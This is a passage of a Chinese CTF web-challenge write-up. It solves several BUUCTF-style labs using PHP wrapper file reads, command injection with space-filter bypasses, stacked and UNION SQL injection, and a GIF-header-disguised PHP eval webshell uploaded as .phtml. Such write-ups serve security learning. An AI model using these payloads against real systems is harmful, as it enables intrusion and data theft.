src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">结合上面的payload，考虑到php伪协议，所以可以构建payload</p><blockquote><p>url+?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 对其进行编码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041725590.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-1"><a href="#二、本题知识点-1" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>常见的五种PHP伪协议</p><p><strong>（1）php:&#x2F;&#x2F;input (碰到file_get_contents()可以通过此绕过)</strong></p><blockquote><p>用法：?file &#x3D;php:&#x2F;&#x2F;input  使数据利用post传过去</p></blockquote><p><strong>（2）php:&#x2F;&#x2F;filter (用来读取文件内容)</strong></p><blockquote><p>用法：?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p><p>​      ?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;xxxx.php</p></blockquote><p><strong>(3) zip:&#x2F;&#x2F; (可以访问压缩包里的内容)</strong></p><blockquote><p>用法:  zip:&#x2F;&#x2F;[压缩包绝对路径]#[压缩包内的文件]</p><p>​      ?file&#x3D;zip:&#x2F;&#x2F;D:\zip.zip%23phpinfo.txt</p></blockquote><p><strong>(4) phar:&#x2F;&#x2F; (与zip:&#x2F;&#x2F;相同)</strong></p><blockquote><p>用法: ?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php (zip要用#隔开，这个用&#x2F;)</p></blockquote><p><strong>(5) data:&#x2F;&#x2F; (读取文件)</strong></p><blockquote><p>用法: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;<br>     ?file&#x3D;data:text&#x2F;plain,<?php phpinfo()?><br>     ?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</p></blockquote><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><h3 id="一、本题做题思路-4"><a href="#一、本题做题思路-4" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合打开网站所给提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726553.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">先ping一下本地网址，查询所有</p><p><strong>payload: 127.0.0.1;ls &#x2F;</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041726558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>看到flag，尝试获取他，通过cd可以达到访问上一个目录的目的</p><p>所以可以构造 <strong>127.0.0.1;cd ..&#x2F;..&#x2F;..&#x2F;;cat flag</strong> 得到flag</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727062.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="一、本题解题思路"><a href="#一、本题解题思路" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p>打开页面根据网站名字，是sql注入，所以尝试下注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727066.png"></p><p>尝试通过select，发现过滤掉很多关键词</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727048.png"></p><p>基本上不考虑联合注入，报错注入了，可以尝试堆叠注入，</p><p>先判断是什么闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727995.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727980.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041727001.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 是’闭合，所以通过此来进行堆叠注入爆库  <strong>1’;show tables– q</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728364.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现两张表，尝试一下爆表,先爆words  <strong>1’;show columns from <code>words</code>– q</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728398.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>再尝试下爆190那个表  <strong>1’;show columns from <code>1919810931114514</code>– q</strong>  发现有flag线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728905.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 但是，如果要接着直接查这个flag就会出现问题了，select等关键词被过滤了，所以我们只能另辟蹊径，根据从网上大佬的wp学习，可以将<strong>1919810931114514</strong>改名为<strong>words</strong>这个表，然后再将<strong>words</strong>这个表改成其他名字，添加<strong>id</strong>字段，将<strong>flag</strong>改为<strong>data</strong>，最后通过系统的select帮我们查出flag具体代码如下:</p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">1&#39;;rename table words to word2;rename table &#96;1919810931114514&#96; to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>然后通过  <strong>1’ or 1&#x3D;1;#</strong>  直接得到flag。如果不放心，你也可以通过上面的爆表，爆库确认一下是否改名成功，有所变化。</p><h3 id="二、本题知识点-2"><a href="#二、本题知识点-2" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>(1)、为什么再爆库，爆表时候要用&#96;&#96;包住表</p><p><strong>反单引号：它是为了区分MySQL的保留字与普通字符而引入的符号。当表名、字段名为一些保留字的时候，如果不用反单引号标注，执行SQL的时候会报错。数据库、表、索引、列和别名用的是引用符是反单引号。</strong></p><p>(2)、<a href="https://blog.csdn.net/qq_45927819/article/details/123594626">大佬博客</a> 对堆叠注入原理和触发条件做了解释，并以此题为例题进行讲解。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><h3 id="一、本题解题思路-1"><a href="#一、本题解题思路-1" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p> 从本题题目猜测大概和Exec那题差不多，打开网页发现只是需要通过get传参来进行ping</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730254.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 跟上题一样先查询一下，得到flag线索 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;ls</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730276.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>尝试抓取一下这个flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041730237.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现他将空格过滤了，不过通过网上学习，发现可以用一些字符绕过空格，例如 <strong>$IFS$9  ${IFS} %09 等 ，</strong>所以我们尝试拼接url一下来重新抓取flag。 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat${IFS}flag</strong></p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731227.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">应该是还过滤一些符号，这里可能过滤{},所以我们换个空格绕过字符: </p><p> <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9flag</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731195.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现其过滤flag这个字符。只能再回头看看线索了，当时不仅有flag.php,还有一个index.php。所以我们可以去查看一下这个 <strong>url+&#x2F;?ip&#x3D;127.0.0.1;cat$IFS$9index.php</strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731211.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>发现里面过滤了很多字符，不过定义了一个变量**$a<strong>，可以通过这个</strong>$a**完成绕过</p><p>拼接url:  <strong>url+&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php。</strong>访问后从源代码找到flag<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041731199.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> <strong>二、本题知识点</strong></p><p> (1)、<strong>空格绕过</strong>，本题除了我上面所说的那几天空格绕过方法，还有类似于 <strong>&lt;&gt; ${IFS &lt; %20</strong>以及我上面所说的那几个。</p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="一、本题做题思路-5"><a href="#一、本题做题思路-5" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>结合题目又是一道sql注入题， </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733865.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>先判断下闭合方式，发现用’闭合时回显为空白，用”闭合回显为nonono，猜测为’闭合</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733861.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733867.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过fuzz测试发现;可以使用，所以我们尝试下堆叠注入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733873.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现flag，尝试抓取它</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733875.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 但是回显是nonono。到这基本上我就寄了，转去网上找大佬wp学习</p><p>大佬猜测后端是如下代码，有着一个或结构。</p><pre class="line-numbers language-none"><code class="language-none">select $_POST[&#39;query&#39;] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>所以只需要将**$_POST[‘query’]** 变成 ***,1**便可以得到flag 。此时语句会变成</p><p><strong>select *,1 from flag  等同于 1 || flag</strong> 短路语法</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733869.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>二、本题知识点</strong> </p><p>(1)、短路语法</p><blockquote><p>|| 逻辑或的短路也是类似的，a||b</p><p>计算机发现a是真，那么扔a；如果a是假，那么扔b</p><p>a||b， 计算机要么执行a要么执行b。a真执行a，a假执行b。</p></blockquote><p>所以 <strong>select 1 from flag的意思其实是建立一个临时列，这个列的所有初始值都被设为1</strong></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><h3 id="一、本题解题思路-2"><a href="#一、本题解题思路-2" class="headerlink" title="一、本题解题思路"></a>一、本题解题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734210.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 看着这个页面什么也没法得到，所以只能从源代码里面找线索了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734454.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p> 发现有个php 点击去看看</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734000.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>点击这个SECRET 发现什么都得不到，说我们已经查阅成功没看清，所以可以考虑一下bp抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734961.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以通过BP抓包，果然在其回显中发现线索，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734023.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 打开这个php，发现是一个代码审计</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734012.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 如果傻傻的去访问这个flag.php，那么依旧是什么都得不到</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734008.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 结合这句话和代码审计里面的 input data。很难不让人想到php伪协议，</p><p>所以我们可以构建这个url </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">url+/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到一大串base64编码，解密一下就可以得到flag了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735713.png"><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a><strong>[极客大挑战 2019]LoveSQL</strong></h2><h3 id="一、本题解题思路-3"><a href="#一、本题解题思路-3" class="headerlink" title="一、本题解题思路"></a><strong>一、本题解题思路</strong></h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736443.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">啊，依旧是一道sql注入题，先看看闭合式吧</p><p>发现用1’是有报错，而1”回显错误账号和密码，所以猜测为用’闭合 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736511.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 用联合注入爆破所有数据库</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736319.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">尝试爆该表字段，构造url</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到其中字段</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736152.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们在抓取其中字段内容，构造url</p><pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736406.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-3"><a href="#二、本题知识点-3" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>联合查询注入(UNION query SQL injectio)<br>获取所有数据库名：<br>union select 1,2,group_concat(schema_name)  from information_schema.schemata –%20</p><p>获取指定数据库下所有表名：<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘库名’ –%20</p><p>获取指定表下所有字段名：<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘表名’ –%20</p><p>获取字段内容</p><p>union select 1,2,group_concat(字段1,字段2,字段3) from 表名 –%20</p></blockquote><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><h3 id="一、本题做题思路-6"><a href="#一、本题做题思路-6" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>同样的，在主页面什么都找不到，只能从源代码里面找线索咯</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738498.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">点击这个php里面找找线索</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">说我们不是来自这个网站，所以我们可以选择用BP抓一下包，改一下来源</p><p>在BP中添加一个 <strong>Referer: <a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></strong> </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041738605.png"></p><p>他又说我们没用这个Syclover浏览器访问，那我们再改一下</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739672.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 又说我们必须本地来读取它，通过加入XFF得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041739692.png"></p><h3 id="二、本题知识点-4"><a href="#二、本题知识点-4" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p> X-Forwarded-For  (XFF) 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p><p>Rerferer: url 代表用所需的网站进行访问</p><p>User-Agent: 代理浏览器</p></blockquote><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><h3 id="一、本题做题思路-7"><a href="#一、本题做题思路-7" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开这个网页就直接给出了提示，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740442.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">放入蚁剑里，通过所POST的作为密码从而连接进入这个网站</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740430.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 然后成功添加后，用其虚拟终端输入 <strong>cat &#x2F;flag</strong> 得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041740419.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="一、本题做题思路-8"><a href="#一、本题做题思路-8" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>上传题，先上传个php文件看看回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看来没戏，尝试用图片绕过，然后BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741781.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 发现其还会对图片内容进行读取，所以我们需要修改图片里的内容，将里面的一句话木马换种方式书写，将其修改为如下代码。</p><pre class="line-numbers language-none"><code class="language-none">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还是不行，又出现一个新的回显， <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742216.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到了这步就要用到一个新的东西，即<strong>文件幻术头绕过</strong>，详情可看这位<a href="https://blog.csdn.net/since_2020/article/details/119414380">大佬博客</a>来进行了解</p><p>总之就是要在上面所述代码内容上面再添加图片文件头(十六进制转换为的字符)</p><pre class="line-numbers language-none"><code class="language-none">GIF89a&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显虽然是上传成功，但是无法从蚁剑内连接进入，通过BP将其后缀修改为.phtml（这里如果你把后缀改成.php7 虽然绕过他对php的检查，但是没法蚁剑连接不进去，也可能是我自己的问题。）</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742189.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">构造payload   <strong>url+&#x2F;upload&#x2F;xxxx.phtml</strong> 放入蚁剑内连接进入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742206.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后跟上题一样，打开虚拟终端  <strong>cat &#x2F;flag</strong>  得到flag </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742184.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-5"><a href="#二、本题知识点-5" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、文件上传后缀绕过，这在打upload-labs靶场时就能积累一些，例如大小写绕过.Php等<strong>。&#x2F;&#x2F;<strong>空格绕过xxx. php等</strong>。&#x2F;&#x2F;</strong>::$DATA，在windows php里面，文件名后加入此字符，系统会将此文件当文件流处理，不会检测其后缀名<strong>。&#x2F;&#x2F;<strong>双写绕过，例如xxx.pphphp等</strong>。&#x2F;&#x2F;</strong>%00截断，这个好像要考虑php版本。</p><p>(2)、文件幻术头绕过，如上面所说，可以去看那位大佬的博客了解一下。</p></blockquote><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><h3 id="一、本题做题思路-9"><a href="#一、本题做题思路-9" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743773.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>当你把鼠标移到灯泡的时候就会发现其实是一个上传题，所以老规矩先看看php回显不。</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743760.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们还是需要上传图片然后再通过BP抓包进行修改。发现回显显示上传成功 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041743771.png"> 不过我们还需要在BP里将.jpg修改为.phtml。同样修改为php7虽然能绕过其对php的过滤，但是没法连接进入。</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744518.png">所以在网站后面加入这个后缀就可以连接进去了，老样子，打开虚拟终端，输入代码得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744414.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="一、本题做题思路-10"><a href="#一、本题做题思路-10" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>先看看它是什么闭合方式，通过对比，发现其还是由’闭合</p><p><img 